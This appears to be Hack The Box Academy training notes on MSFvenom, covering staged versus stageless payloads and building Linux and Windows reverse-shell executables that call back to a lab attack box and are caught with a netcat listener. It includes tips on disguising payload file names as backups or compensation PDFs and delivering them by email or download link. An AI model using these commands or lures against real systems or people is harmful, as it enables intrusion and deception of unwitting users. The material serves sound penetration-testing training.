There will be situations where we do not have direct network access to a vulnerable target machine. In these cases, we will need to get crafty in how the payload gets delivered and executed on the system. One such way may be to use `MSFvenom` to craft a payload and send it via email message or other means of social engineering to drive that user to execute the file.

In addition to providing a payload with flexible delivery options, MSFvenom also allows us to `encrypt` & `encode` payloads to bypass common anti-virus detection signatures. Let's practice a bit with these concepts.

## Practicing with MSFvenom

In Pwnbox or any host with MSFvenom installed, we can issue the command `msfvenom -l payloads` to list all the available payloads.

#### List Payloads

```
tylapcheong@htb[/htb]$ msfvenom -l payloads
```

## Staged vs. Stageless Payloads

`Staged` payloads create a way for us to send over more components of our attack. We can think of it like we are "setting the stage" for something even more useful. Take for example this payload `linux/x86/shell/reverse_tcp`.  When run using an exploit module in Metasploit, this payload will send a small `stage` that will be executed on the target and then call back to the `attack box` to download the remainder of the payload over the network, then executes the shellcode to establish a reverse shell.

`Stageless` payloads do not have a stage. Take for example this payload `linux/zarch/meterpreter_reverse_tcp`. Using an exploit module in Metasploit, this payload will be sent in its entirety across a network connection without a stage. This could benefit us in environments where we do not have access to much bandwidth and latency can interfere. Staged payloads could lead to unstable shell sessions in these environments, so it would be best to select a stageless payload. In addition to this, stageless payloads can sometimes be better for evasion purposes due to less traffic passing over the network to execute the payload, especially if we deliver it by employing social engineering. This concept is also very well explained by Rapid 7 in this blog post on [stageless Meterpreter payloads](https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/).

 Take our examples from above, `linux/x86/shell/reverse_tcp` is a staged payload, and we can tell from the name since each / in its name represents a stage from the shell forward. So `/shell/` is a stage to send, and `/reverse_tcp` is another. This will look like it is all pressed together for a stageless payload.
## Building A Stageless Payload

Now let's build a simple stageless payload with msfvenom and break down the command.
#### Build It

```
tylapcheong@htb[/htb]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
```
#### Call MSFvenom
```
msfvenom
```
Defines the tool used to make the payload.

#### Creating a Payload
`-p`

This `option` indicates that msfvenom is creating a payload.

#### Choosing the Payload based on Architecture
`linux/x64/shell_reverse_tcp`

Specifies a `Linux` `64-bit` stageless payload that will initiate a TCP-based reverse shell (`shell_reverse_tcp`).

#### Address To Connect Back To
`LHOST=10.10.14.113 LPORT=443`

When executed, the payload will call back to the specified IP address (`10.10.14.113`) on the specified port (`443`).

#### Format To Generate Payload In
`-f elf`

The `-f` flag specifies the format the generated binary will be in. In this case, it will be an [.elf file](https://en.wikipedia.org/wiki/Executable_and_Linkable_Format).

#### Output
`> createbackup.elf`

Creates the .elf binary and names the file createbackup. We can name this file whatever we want. Ideally, we would call it something inconspicuous and/or something someone would be tempted to download and execute.

## Executing a Stageless Payload

At this point, we have the payload created on our attack box. We would now need to develop a way to get that payload onto the target system. There are countless ways this can be done. Here are just some of the common ways:

- Email message with the file attached.
- Download link on a website.
- Combined with a Metasploit exploit module (this would likely require us to already be on the internal network).
- Via flash drive as part of an onsite penetration test.

Once the file is on that system, it will also need to be executed.

We would have a listener ready to catch the connection on the attack box side upon successful execution.

#### NC Connection
`tylapcheong@htb[/htb]$ sudo nc -lvnp 443`

When the file is executed, we see that we have caught a shell.
#### Connection Established
```
tylapcheong@htb[/htb]$ sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.138.85 60892
env
PWD=/home/htb-student/Downloads
cd ..
ls
Desktop
Documents
Downloads
```

## Building a simple Stageless Payload for a Windows system

We can also use msfvenom to craft an executable (`.exe`) file that can be run on a Windows system to provide a shell.

#### Windows Payload
```
tylapcheong@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```
The command syntax can be broken down in the same way we did above. The only differences, of course, are the `platform` (`Windows`) and format (`.exe`) of the payload.

## Executing a Simple Stageless Payload On a Windows System

This is another situation where we need to be creative in getting this payload delivered to a target system. Without any `encoding` or `encryption`, the payload in this form would almost certainly be detected by Windows Defender AV.

If the AV was disabled all the user would need to do is double click on the file to execute and we would have a shell session.
```
tylapcheong@htb[/htb]$ sudo nc -lvnp 443
```

